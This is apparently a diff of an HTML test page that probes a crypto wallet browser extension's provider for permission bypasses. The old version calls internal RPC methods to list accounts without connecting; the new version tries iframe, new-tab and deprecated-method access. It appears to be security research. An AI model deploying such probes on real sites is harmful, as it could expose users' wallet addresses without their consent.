@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-<button onclick="test()">Bypass Test</button>
+<button onclick="test()">Origin Confusion Test</button>
 <pre id="result">...</pre>
 
 <script>
@@ -9,67 +9,70 @@ async function test() {
   const r = document.getElementById('result');
   let out = '';
 
-  // 1. Coba eth_accounts via _rpcRequest
-  // tanpa connect dulu
-  out += '=== eth_accounts bypass ===\n';
-  await new Promise(resolve => {
-    window.ethereum._rpcRequest(
-      { method: 'eth_accounts', params: [] },
-      (err, result) => {
-        out += JSON.stringify(result) + '\n';
-        resolve();
-      }
-    );
-  });
-
-  // 2. Coba requestBatch untuk bypass
-  out += '\n=== requestBatch bypass ===\n';
+  // 1. Coba inject ethereum ke iframe
+  out += '=== iframe ethereum access ===\n';
   try {
-    const result = await window.ethereum._metamask.requestBatch([
-      { method: 'eth_accounts', params: [] },
-      { method: 'eth_chainId', params: [] },
-      { method: 'net_version', params: [] }
-    ]);
-    out += JSON.stringify(result, null, 2) + '\n';
+    const iframe = document.createElement('iframe');
+    iframe.srcdoc = '<script>window.parent.postMessage(JSON.stringify(Object.keys(window.ethereum || {})), "*")<\/script>';
+    document.body.appendChild(iframe);
+    
+    window.addEventListener('message', e => {
+      out += 'iframe ethereum keys: ' + e.data + '\n';
+      r.textContent = out;
+    }, {once: true});
   } catch(e) {
     out += 'Error: ' + e.message + '\n';
   }
 
-  // 3. Coba wallet_getPermissions
-  out += '\n=== wallet_getPermissions ===\n';
-  await new Promise(resolve => {
-    window.ethereum._rpcRequest(
-      { method: 'wallet_getPermissions', params: [] },
-      (err, result) => {
-        out += JSON.stringify(result, null, 2) + '\n';
-        resolve();
+  // 2. Coba window.open dan akses ethereum
+  out += '\n=== window.open ethereum ===\n';
+  try {
+    const tab = window.open('about:blank', '_blank');
+    setTimeout(() => {
+      try {
+        const hasEthereum = tab.ethereum !== undefined;
+        out += 'tab.ethereum exists: ' + hasEthereum + '\n';
+        r.textContent = out;
+      } catch(e) {
+        out += 'Error: ' + e.message + '\n';
+        r.textContent = out;
       }
-    );
-  });
+    }, 500);
+  } catch(e) {
+    out += 'Error: ' + e.message + '\n';
+  }
 
-  // 4. Coba eth_coinbase tanpa connect
-  out += '\n=== eth_coinbase ===\n';
-  await new Promise(resolve => {
-    window.ethereum._rpcRequest(
-      { method: 'eth_coinbase', params: [] },
+  // 3. Coba sendAsync bypass
+  out += '\n=== sendAsync bypass ===\n';
+  try {
+    window.ethereum.sendAsync(
+      { method: 'eth_accounts', params: [], id: 1, jsonrpc: '2.0' },
       (err, result) => {
-        out += JSON.stringify(result) + '\n';
-        resolve();
+        out += 'sendAsync result: ' + JSON.stringify(result) + '\n';
+        r.textContent = out;
       }
     );
-  });
+  } catch(e) {
+    out += 'Error: ' + e.message + '\n';
+  }
 
-  // 5. Coba personal_listAccounts
-  out += '\n=== personal_listAccounts ===\n';
-  await new Promise(resolve => {
-    window.ethereum._rpcRequest(
-      { method: 'personal_listAccounts', params: [] },
-      (err, result) => {
-        out += JSON.stringify(result) + '\n';
-        resolve();
-      }
-    );
-  });
+  // 4. Coba send (deprecated method)
+  out += '\n=== send bypass ===\n';
+  try {
+    const result = window.ethereum.send('eth_accounts');
+    out += 'send result: ' + JSON.stringify(result) + '\n';
+  } catch(e) {
+    out += 'Error: ' + e.message + '\n';
+  }
+
+  // 5. Coba enable() deprecated
+  out += '\n=== enable() ===\n';
+  try {
+    const result = await window.ethereum.enable();
+    out += 'enable result: ' + JSON.stringify(result) + '\n';
+  } catch(e) {
+    out += 'enable error: ' + e.message + '\n';
+  }
 
   r.textContent = out;
 }
